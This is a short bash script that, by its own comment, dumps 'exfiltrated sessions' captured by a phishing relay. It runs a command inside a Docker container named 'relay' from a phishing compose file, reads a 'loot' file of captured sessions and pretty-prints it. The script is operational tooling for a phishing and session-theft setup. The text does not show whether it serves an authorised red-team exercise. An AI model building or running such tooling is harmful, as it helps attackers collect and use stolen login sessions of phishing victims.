#!/usr/bin/env bash
# Dumps the exfiltrated sessions captured by the phishing relay
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

docker-compose -f "$ROOT/phishing/compose.yaml" exec -T relay \
  sh -c 'cat /app/loot/captured_sessions.jsonl 2>/dev/null' |
  (command -v jq >/dev/null 2>&1 && jq . || cat)
